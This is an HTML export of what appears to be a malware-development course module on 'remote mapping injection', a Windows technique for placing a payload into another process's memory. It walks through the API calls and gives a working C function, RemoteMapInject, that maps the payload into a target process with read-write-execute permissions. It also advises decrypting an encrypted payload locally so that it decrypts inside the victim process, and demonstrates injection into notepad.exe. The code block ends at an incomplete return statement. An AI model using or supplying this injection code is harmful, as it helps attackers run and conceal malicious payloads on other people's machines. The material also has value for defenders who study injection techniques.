<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>43. Remote Mapping Injection</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="268ba3a4-ebcd-42e8-a6a9-9cf2c8eb88c2" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/43"><strong>43. Remote Mapping Injection</strong></a></h1></header><div class="page-body"><h2 id="a02f9d98-b429-4260-8f80-cadbfc0b9a8b" class=""><strong>Remote Mapping Injection</strong></h2><h3 id="55c18a74-1f99-43f4-a46e-042d2849e663" class=""><strong>Introduction</strong></h3><p id="e3d9e175-856e-40a3-b072-85cd881429b9" class="">The previous module demonstrated a method to perform local payload execution without the need of using private memory. This module demonstrates the same technique on a remote process instead.</p><h3 id="6bc027f4-7381-4289-9c62-6333c4458e36" class=""><strong>Remote Mapping Injection</strong></h3><p id="0902bbc7-2d33-43e6-b42a-7b6fb31e2647" class="">This section explains the WinAPIs required to perform remote mapping injection. The steps to perform remote mapping injection are listed below.</p><ol type="1" id="e7409784-73ee-4767-9811-24186899ae29" class="numbered-list" start="1"><li><code>CreateFileMapping</code> is called to create a file mapping object.</li></ol><ol type="1" id="8115f117-98e3-45b2-abf8-23e1fea78c17" class="numbered-list" start="2"><li><code>MapViewOfFile</code> is then called to map the file mapping object into the local process address space.</li></ol><ol type="1" id="54e14b89-8589-4924-a334-f8c0ae1aafb7" class="numbered-list" start="3"><li>The payload is moved to the locally allocated memory.</li></ol><ol type="1" id="39b1c01b-ea97-4bcd-bf90-1bb034a5b1f1" class="numbered-list" start="4"><li>A new view of file is mapped into the remote address space of the target process, using <code>MapViewOfFile2</code>, mapping the local view of file into the remote process, and thus our copied payload.</li></ol><h3 id="7ee05c0b-9f19-441b-85d8-52135a207396" class=""><strong>MapViewOfFile2</strong></h3><p id="34af9584-8476-4f16-a946-09b61cab153b" class=""><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2">MapViewOfFile2</a> maps a view of a file into the address space of a specified, remote process.</p><pre id="7be967b0-06cd-4e49-a239-e6fc5a64eba2" class="code code-wrap"><code>PVOID MapViewOfFile2(
  [in]           HANDLE  FileMappingHandle,   // Handle to the file mapping object returned by CreateFileMappingA/W
  [in]           HANDLE  ProcessHandle,       // Target process handle
  [in]           ULONG64 Offset,              // Not required - NULL
  [in, optional] PVOID   BaseAddress,         // Not required - NULL
  [in]           SIZE_T  ViewSize,            // Not required - NULL
  [in]           ULONG   AllocationType,      // Not required - NULL
  [in]           ULONG   PageProtection       // The desired page protection.
);
</code></pre><ul id="4c949b9c-2ec0-4fb3-820e-61440a05dfb1" class="bulleted-list"><li style="list-style-type:disc"><code>FileMappingHandle</code> - A HANDLE to a section that is to be mapped into the address space of the specified process.</li></ul><ul id="b27a2986-5f99-4c18-aace-96439e8734e3" class="bulleted-list"><li style="list-style-type:disc"><code>ProcessHandle</code> - A HANDLE to a process into which the section will be mapped. The handle must have the <code>PROCESS_VM_OPERATION</code> access mask.</li></ul><ul id="c31be82a-556e-4ff7-bdb2-c871cefcef8b" class="bulleted-list"><li style="list-style-type:disc"><code>PageProtection</code> - The desired page protection.</li></ul><h3 id="130833f7-75d3-4586-b83d-5efcb4fcaa04" class=""><strong>Implementation Note</strong></h3><p id="19e6e764-8e58-4d0d-9d67-2e386a84c245" class="">Unlike local mapping injection, it&#x27;s not necessary to make the locally mapped view of the file executable since the payload is not executed locally. Instead, the <code>MapViewOfFile</code> uses the <code>FILE_MAP_WRITE</code> flag in order to copy the payload. <code>MapViewOfFile2</code> will then map the same bytes to the address space of the target process.</p><p id="8f6e12a4-6eaf-4b1f-809a-33510ad820f1" class=""><code>MapViewOfFile2</code> shares the file mapping handle with <code>MapViewOfFile</code>. Therefore, any modifications to the payload in the locally mapped view of the file is reflected in the remote mapped view of the file in the remote process. This is useful for real-world implementations where an encrypted payload needs to be run, as the payload can be mapped to the remote process and decrypted locally, thus decrypting the payload in the remote view of the file for execution.</p><h3 id="2014e453-2686-431e-b0d4-98246c7a5582" class=""><strong>Remote Mapping Injection Function</strong></h3><p id="97d5fad4-c3b4-4b74-847e-b05042e46b6a" class=""><code>RemoteMapInject</code> is a function that performs remote mapping injection. It takes 4 arguments:</p><ul id="6f1d1179-932c-423d-87bf-1316fc9d1274" class="bulleted-list"><li style="list-style-type:disc"><code>hProcess</code> - The handle to the target process.</li></ul><ul id="72aca3ea-80c8-4918-9e8b-d557626f5053" class="bulleted-list"><li style="list-style-type:disc"><code>pPayload</code> - The payload&#x27;s base address.</li></ul><ul id="0aeb0fb5-62e7-49cc-b0d9-6ffd07f788ba" class="bulleted-list"><li style="list-style-type:disc"><code>sPayloadSize</code> - The size of the payload.</li></ul><ul id="42122d79-ed27-4d9c-9e79-f6084f89ca69" class="bulleted-list"><li style="list-style-type:disc"><code>ppAddress</code> - A pointer to PVOID that receives the mapped memory&#x27;s base address.</li></ul><p id="dc78733c-916f-4017-aa69-ecaa7ab180f3" class="">The function allocates a locally mapped readable-writable buffer and then copies the payload to it. It then uses <code>MapViewOfFile2</code> to map the local payload to a new remote buffer in the target process and finally returns the base address of the mapped memory.</p><pre id="8b9d7ae2-805b-48bc-a8ec-d37e3fb23702" class="code code-wrap"><code>BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL        bSTATE            = TRUE;
	HANDLE      hFile             = NULL;
	PVOID       pMapLocalAddress  = NULL,
                pMapRemoteAddress = NULL;

    // Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf(&quot;\t[!] CreateFileMapping Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

    // Maps the view of the payload to the memory
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf(&quot;\t[!] MapViewOfFile Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

    // Copying the payload to the mapped memory
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// Maps the payload to a new remote buffer in the target process
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf(&quot;\t[!] MapViewOfFile2 Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf(&quot;\t[+] Remote Mapping Address : 0x%p \n&quot;, pMapRemoteAddress);

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return

</code></pre><h3 id="8c348e49-125f-47da-92b5-6bfb0daad817" class=""><strong>UnmapViewOfFile</strong></h3><p id="38350ef7-6b8a-4748-8e2c-48703d5b42c1" class="">Recall that <code>UnmapViewOfFile</code> only takes the base address of the mapped view of a file that is to be unmapped. Calling the <code>UnmapViewOfFile</code> WinAPI to unmap the locally mapped payload is prohibited when the payload is still running because the remote view of the file is a reflection of the local one. Therefore, unmapping the local file map view will cause the remote process to crash since the payload is still active.</p><h3 id="39380a5b-f5f0-4066-b495-de97f6adf3f3" class=""><strong>Demo</strong></h3><p id="2910245c-f6f0-47ee-849d-39277b08f17c" class="">The target process for this demo is <code>Notepad.exe</code>.</p><figure id="78787bf3-8251-4089-ab7e-2f6da6b71d73" class="image"><a href="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-109431584-4f2ef9e2-3d8e-49ce-9998-b9070c566647.png"><img style="width:1347px" src="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-109431584-4f2ef9e2-3d8e-49ce-9998-b9070c566647.png"/></a></figure><p id="b70d8d66-7f6d-4d50-a110-5e7aeb3ff80b" class="">The image below shows the locally mapped memory containing the payload. Notice that the permissions on the memory is <code>RW</code>.</p><figure id="47ed00db-0e3f-44df-b325-0a4bd62596fc" class="image"><a href="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-209431586-0863ea8b-fa83-486b-aeac-ff718f759de7.png"><img style="width:1786px" src="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-209431586-0863ea8b-fa83-486b-aeac-ff718f759de7.png"/></a></figure><p id="8f20e8ec-5e51-4be9-b7e6-4d6823292d6f" class=""><code>MapViewOfFile2</code> maps the same bytes to the address space of the target process, <code>notepad.exe</code>. The remotely mapped memory now contains the payload with <code>RWX</code> permissions.</p><figure id="d161680d-40c7-482e-a7e0-bcaa92b9ff2c" class="image"><a href="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-309431587-6d988463-f0aa-4cc2-8252-1b0d1426af2d.png"><img style="width:1780px" src="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-309431587-6d988463-f0aa-4cc2-8252-1b0d1426af2d.png"/></a></figure><p id="6cfd5e89-78bf-483b-8468-96d187c2300b" class="">Executing the payload (Using <code>CreateRemoteThread</code> for simplicity)</p><figure id="0e10784d-674d-4305-a10f-ab6df5bb6a00" class="image"><a href="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-409431570-6cd31d0b-0dee-4930-97d3-5124112c3e77.png"><img style="width:1672px" src="43%20Remote%20Mapping%20Injection%20268ba3a4ebcd42e8a6a99cf2c8eb88c2/remote-map-409431570-6cd31d0b-0dee-4930-97d3-5124112c3e77.png"/></a></figure></div></article></body></html>